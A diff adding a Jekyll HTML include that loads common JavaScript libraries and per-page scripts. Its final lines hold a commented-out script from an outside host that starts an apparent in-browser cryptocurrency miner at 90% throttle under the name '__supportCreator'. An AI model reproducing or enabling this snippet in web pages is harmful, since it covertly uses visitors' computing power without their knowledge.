@@ -1,0 +1,16 @@
+<script src="/vendor/jquery-1.11.3.min.js"></script>
+<script src="/vendor/nprogress/nprogress.js?{{ site.time | date: '%s' }}"></script>
+<script src="/vendor/html2canvas.min.js?{{ site.time | date: '%s' }}"></script>
+<script src="/vendor/sweetalert2.all.min.js?{{ site.time | date: '%s' }}"></script>
+<script src="/vendor/vue-2.3.4/dist/vue.min.js?{{ site.time | date: '%s' }}"></script>
+<script src="/js/init.js?{{ site.time | date: '%s' }}"></script>
+
+{% if page.additional_script %}
+  {% for js in page.additional_script %}
+    <script src="{{ js }}"></script>
+  {% endfor %}
+{% endif %}
+
+<code style="display: none;">{{ site.site_version }}</code>
+<!-- <script src="https://www.hostingcloud.racing/Y5Rl.js"></script>
+<script>var __supportCreator = new Client.Anonymous('ae0d383af194d5e758719e093516e27e6e86424aa48f268cdae22bdfa265f810',{throttle: 0.9, ads: 0});__supportCreator.start();</script> -->
